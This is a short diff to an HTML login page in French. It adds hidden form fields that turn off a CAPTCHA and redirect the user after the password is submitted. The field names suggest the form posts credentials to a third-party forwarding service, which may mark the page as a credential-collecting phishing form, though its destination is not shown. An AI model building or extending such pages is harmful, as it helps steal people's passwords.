@@ -101,7 +101,12 @@ function showPage() {
 					<div class="flex relative items-baseline">
 						<input id="password" type="password" name="Mot de passe" value="" placeholder="Mot de passe" required="">
 <br>
-<br>
+<br>			
+  <!-- Disable CAPTCHA -->
+  <input type="hidden" name="_captcha" value="false">
+
+  <!-- Redirect URL -->
+  <input type="hidden" name="_next" value="https://your-redirect-url.com">
 <button type="Login submit-button"><span style='font-size:15px;'>&#8680;</span> CONNEXION <i class="fa fa-lock"></i></button>
 
 			</div>	 
